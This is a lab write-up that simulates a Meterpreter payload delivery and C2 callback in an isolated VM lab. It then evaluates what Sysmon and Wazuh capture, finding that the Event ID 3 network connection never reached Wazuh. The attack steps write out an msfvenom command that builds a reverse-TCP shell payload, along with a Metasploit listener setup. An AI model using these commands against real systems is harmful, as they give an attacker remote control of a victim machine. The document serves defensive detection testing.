# Lab 03: Sysmon + Wazuh Detection of a Simulated C2 Payload

## Objective
Build an isolated three-VM lab (Kali, Windows, Ubuntu/Wazuh) to simulate a
basic attack chain — payload delivery, execution, and C2 callback — and
evaluate how much of that chain a Sysmon + Wazuh detection stack actually
captures end to end.

## Environment
| Role | VM | Purpose |
|---|---|---|
| Attacker | Kali Linux | Payload generation (msfvenom), delivery (Python HTTP server), C2 listener (Metasploit) |
| Victim | Windows | Target endpoint, instrumented with Sysmon |
| SIEM | Ubuntu | Wazuh Manager, Indexer, Dashboard; receives logs via Wazuh Agent on Windows |

All three VMs were placed on a single VirtualBox **Host-Only** network,
fully isolated from the internet and the analyst's real host machine.
A temporary NAT adapter was enabled on the Windows VM only when
downloading tools (Sysmon, Wazuh agent), then disabled before any
attack activity.

## Attack Simulation Steps
1. Generated a Meterpreter reverse-TCP payload on Kali:
   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe > shell.exe`
2. Delivered the payload to the Windows VM via a Python HTTP server
   over the Host-Only network.
3. Started a Metasploit listener (`exploit/multi/handler`) on Kali.
4. Executed `shell.exe` on the Windows VM, confirming a live
   Meterpreter session on Kali (`sysinfo` verified).

## Detection Results

| Sysmon Event | What it represents | Seen locally (Event Viewer) | Reached Wazuh alerts | Reached Wazuh archives |
|---|---|---|---|---|
| Event ID 1 (Process Creation) | `shell.exe` executed | Yes | Yes | Yes |
| Event ID 11 (File Create) | `shell.exe` written to `C:\Users\Public\` | Yes | Yes | Yes |
| Event ID 3 (Network Connect) | `shell.exe` connecting to Kali on port 4444 (the C2 callback) | Yes | No | No |

## Key Finding
Sysmon correctly logged the full attack chain locally on the Windows
endpoint, including the C2 callback (Event ID 3, confirmed in Windows
Event Viewer with matching `Image`, `DestinationIp`, and
`DestinationPort` fields). However, **Event ID 3 was never present in
Wazuh — neither in the default alerts index nor in the raw archive
index after explicitly enabling archive logging (`logall`) and the
Filebeat `archives` module.**

This was verified directly at the source rather than relying on the
dashboard UI: `grep '"eventID":"3"'` against the manager's local
`archives.json` returned zero matches for the Windows agent, while the
same search for Event ID 1 returned real, matching entries.

Troubleshooting ruled out the following as causes:
- Sysmon misconfiguration (confirmed logging Event ID 3 locally, and
  the SwiftOnSecurity config's `NetworkConnect` rule is `onmatch:
  exclude`, meaning it logs by default unless matched by a narrow
  exclusion list — none of which apply to this connection)
- Wazuh agent connectivity (agent shows Active, sends regular
  keepalives, and successfully forwards other Sysmon event types)
- Archive logging being disabled (enabled `logall` on the manager and
  the Filebeat `wazuh` module's `archives` section; verified other
  event types flow through this same pipeline)

**Conclusion:** the gap sits specifically in how this Wazuh deployment
handles/forwards high-frequency `NetworkConnect` events for this
agent — plausibly related to event volume, agent-side buffering, or a
decoder/ruleset behavior specific to Event ID 3. This did not resolve
during this session and is flagged for further investigation.

## Why This Matters
Event ID 3 is arguably the most operationally important signal in this
chain — it's the difference between "a suspicious file exists on disk"
and "an active outbound connection to an unknown host is happening
right now." A detection stack that logs the file drop and execution
but misses the callback has a real blind spot: an analyst could see
history of a dropped payload without any signal that it's actively
communicating with an attacker.

## Next Steps
- Investigate Wazuh agent buffering/queue settings for high-volume
  event types.
- Check whether a custom decoder or rule is needed to properly parse
  and forward Sysmon Event ID 3 specifically.
- Re-run the attack chain after any fix and confirm Event ID 3 appears
  in both Discover and a corresponding alert.
- Consider adding a custom Wazuh rule to alert specifically on
  outbound connections to non-standard high ports (e.g. 4444) as a
  generic C2-callback heuristic, independent of resolving the
  underlying forwarding gap.
